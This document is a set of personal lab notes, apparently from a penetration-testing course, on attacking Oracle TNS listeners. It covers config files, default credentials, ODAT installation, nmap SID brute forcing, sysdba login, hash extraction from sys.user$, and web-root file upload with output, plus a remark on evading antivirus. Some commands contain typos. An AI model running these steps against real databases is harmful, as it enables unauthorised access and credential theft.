
1. The Transparent Network Substrate{TNS} server is a communication  protocol that facilitates communication between Oracle database and application over network.
2. TNS supports various networking protocols between Oracle DB and application.
3. Such as ***==IPX/SPX, TCP/IP, UDP and Apple talk==*** protocol stacks.
4. It becomes a preferred solution for managing large, complex DB in healthcare, finance, and retail industries. 
5. Its built-in encryption mechanism ensures the security of data transmission.   
6. TNS has been updated to support new technologies, that includes Ipv6 and SSL/TLS encryption for 
	- a. Name Resolution 
	- b. Connection Management 
	- c. Load Balancing 
	- d. Security 
## Default Configuration:
##### 1. Basics:
1. The default configuration of the Oracle TNS server depends on the version and edition of Oracle software installed.
2. Default Listener listens for incoming connection on ***==port TCP/1521.==*** 
3. Oracle TNS can be remotely managed in `Oracle 8i/9i` but not in `Oracle 10g/11g`.
##### 2. Security Features:
1. Default TNS listener also includes a few basic security features.
	 a. The Listener will use Oracle Net Services to encrypt the communication between the client and the server. 
2. The configuration files for Oracle TNS are called ***tnsnames.ora*** and ***listener.ora***, are physically located at ***==$ORACLE_HOME/network/admin.==***
3. Oracle TNS is often used with other 
	1. Oracle DBSNMP
	2. Oracle DB
	3. Oracle Application Server 
	4. Oracle Enterprise Manager
	5. Oracle Fusion Middleware
	6. webserver and many more
4. Oracle 9 has default password, ==***CHANGE_ON_INSTALL***==, whereas Oracle 10 has no default password set.
5. Oracle DBSNMP service also uses a default password, dbsnmp.
6. Many organizations still use the `finger` service together with Oracle.

#### Tnsname.ora
Contains the necessary information for ***clients*** to connect to the service.

	For Example:
	
		ORCL =
		  (DESCRIPTION =
		    (ADDRESS_LIST =
			      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
		    )
			(CONNECT_DATA =
			    (SERVER = DEDICATED)
			    (SERVICE_NAME = orcl)
		    )
		  )
Service called ORCL, host: 10.129.11.102, protocol: TCP, Port: 1521 ***Retrieve from the tnsname,ora***
#### Listener.ora
Listener process uses the listener.ora file to determine the services it should listen to and the behavior of the listener.

	For example:
	SID_LIST_LISTENER =
		  (SID_LIST =
		    (SID_DESC =
			    (SID_NAME = PDB1)
			    (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
			    (GLOBAL_DBNAME = PDB1)
			    (SID_DIRECTORY_LIST =
			        (SID_DIRECTORY =
				        (DIRECTORY_TYPE = TNS_ADMIN)
				        (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
			    )
		      )
		)
	  )
	LISTENER =
		  (DESCRIPTION_LIST =
			(DESCRIPTION =
		      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
		      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
	    )
	  )

	ADR_BASE_LISTENER = C:\oracle

1. Oracle databases can be protected by using so-called PL/SQL Exclusion list (`PlsqlExclusionList`). `//black-List`.
2. It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper` directory.
3. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a ==***blacklist that cannot be accessed through the Oracle Application Server.***==

## Important Settings:

1. Description | A descriptor that provides a name for the database & its conctn types
2. Address | Network address of the DB, which includes the port number and hostname
3. Protocol | The network protocol used for communication  with the server
4. Port | The port number used for communication with the server
5. Connect_Data | Specifies the attributes of the connection.
6. Instance_Name | The name of the database instance the client wants to connect
7. Service_Name | The name of the service that the client wants to connect to
8. Server | The type of server used for the database connection
9. User | The username used to authenticate with the database server
10. Password | The password used to authenticate with the database server
11. Security | The type of security for the connection
12. Validate_Cert | Whether to validate the certificate using SSL/TLS
13. SSL_Version | The version of SSL/TLS to use for the connection
14. Connect_Timeout | The time limit in seconds for the client to establish a connection to the database
15. Receive_Timeout | The time limit in seconds for the client to receive a response from the database
16. Send_Timeout | The time limit in seconds for the client to send a request to the database
17. SQLNET.Expire_Time | The time limit in seconds for the client to detect a connection has failed
18. Trace_Level | The level of tracing for the database connection
19. Trace_Directory | The directory where the trace files are stored
20. Trace_File_Name | The name of the trace file
21. Log_File | The file where the log information is stored

##### Configuration:

`
1. To download:
	`1. wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip`

	`2. mkdir -p /opt/oracle`

	`3. uzip -d /opt/oracle instanntclient-basic-linux.x64.21.4.0.0.0dbru.zip`

	`4. uzip -d /opt/oracle instanntclient-sqlplus-linux.x64.21.4.0.0.0dbru.zip`

	`5. export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH`

	`6. export PATH=$LD_LIBRARY_PATH:$PATH`

7.`source ~/.bashrc`
`cd ~`
`git clone https://github.com/quentinhardy/odat.git`
`cd odat/`
`pip install python-libnmap`
`git submodule init`
`git submodule update`
`pip3 install cx_Oracle`
`sudo apt-get install python3-scapy -y`
`sudo pip3 install colorlog termcolor passlib python-libnmap`
`sudo apt-get install build-essential libgmp-dev -y`
`pip3 install pycryptodome`

## Testing ODAT

- To execute tool:
		- ./odat.py -h

- Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases
-  Used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation

## Footprinting 

1. NMAP
	- ```sudo nmap -p1521 -sV <target> --open```
			- if SID is not specified then use default SID that is in tnsnames.ora
	- ```nmap -p1521 -sV <target> --open --script oracle-sid-brute```
			- For SID brute forcing. ``can use  `nmap`, `hydra`, `odat`

2. ODAT
	```./odat.py all -s <target>``` to find possible flaws.

3. sqlplus
	```a tool used to connect to the Oracle databse and interact```
	
	``` sqlplus username/passsword@target/SID```
	
	```#### if faced error:sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory```
	
	
	```run the command:sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig```

##### for extra SQLplus commands:
	https://docs.oracle.com/en/database/oracle/oracle-database/23/sqlqr/SQL-Plus-Commands.html#GUID-8D2B460E-AF21-4756-9703-D7442CDF33F6


##### Oracle RDBMS-Database Enumeration
1. ```sqlplus scott/tiger@10.129.204.235/XE as sysdba```
	-  System Database Admin (`sysdba`), giving us higher privileges

##### Oracle RDBMS - Extract Password Hashes
1.  `sys.user$` and try to crack them offline`
2. Another option is to upload a web shell to the target
	-  if we know what type of system we are dealing with, we can try the default paths
		- Linux- /var/www/html
		- Windows- C:\inetpub\wwwroot
		
##### Oracle RDBMS - File Upload
- Exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important

	- ```echo "Oracle File Upload Test" > testing.txt```
	- ```./odat.py utlfile -s <target> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt```
		- ```[1] (10.129.204.235:1521): Put the ./testing.txt local file in the ***C:\inetpub\wwwroot*** folder like testing.txt on the 10.129.204.235 server 
		 [+] The ./testing.txt file was created on the ***C:\inetpub\wwwroot*** directory on the 10.129.204.235 server like the testing.txt file```





[[Nmap Basics]]
[[Footprinting important commands]]
